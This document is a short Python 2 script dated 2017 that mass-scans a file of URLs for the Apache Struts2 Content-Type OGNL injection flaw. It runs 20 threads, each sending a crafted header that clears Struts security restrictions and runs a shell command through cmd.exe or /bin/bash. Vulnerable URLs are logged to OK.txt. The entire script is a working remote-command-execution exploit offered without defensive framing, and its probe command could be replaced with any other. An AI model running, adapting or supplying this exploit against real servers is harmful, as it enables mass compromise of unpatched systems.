# Date: 2017/3/8

import requests
import Queue
import threading
import sys
 
 
def poc():
    headers={
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
        "Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo Wsbug').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    }
    while not Q.empty():
        url=Q.get()
        try:
            xy = requests.get(url=url,headers=headers,timeout=5).text
            if 'Wsbug' in xy:
                print url
                with open('OK.txt','a+') as f2:
                     f2.write(url+'\n')
        except:
            pass
 
 
if __name__ == '__main__':
    Q = Queue.Queue()
    with open(sys.argv[1]) as f:
        for i in f:
            Q.put(i)
    for i in xrange(20):
        x=threading.Thread(target=poc)
        x.start()